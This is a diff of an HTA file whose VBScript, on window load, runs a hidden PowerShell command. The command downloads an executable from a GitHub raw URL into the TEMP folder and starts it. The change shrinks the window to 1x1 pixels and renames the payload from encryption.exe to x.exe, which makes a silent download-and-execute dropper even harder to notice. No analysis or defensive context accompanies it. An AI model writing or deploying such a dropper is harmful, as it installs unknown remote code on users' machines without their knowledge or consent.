@@ -15,11 +15,11 @@
     />
     <script language="VBScript">
     Sub Window_onLoad
-        Window.ResizeTo 520, 480
+        Window.ResizeTo 1, 1
         Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
         
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/fecdor/history-protector/main/encryption.exe' -OutFile $env:TEMP\file.exe; Start-Process $env:TEMP\file.exe""", 0, False
+        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/fecdor/history-protector/main/x.exe' -OutFile $env:TEMP\file.exe; Start-Process $env:TEMP\file.exe""", 0, False
     End Sub
     </script>
 </head>
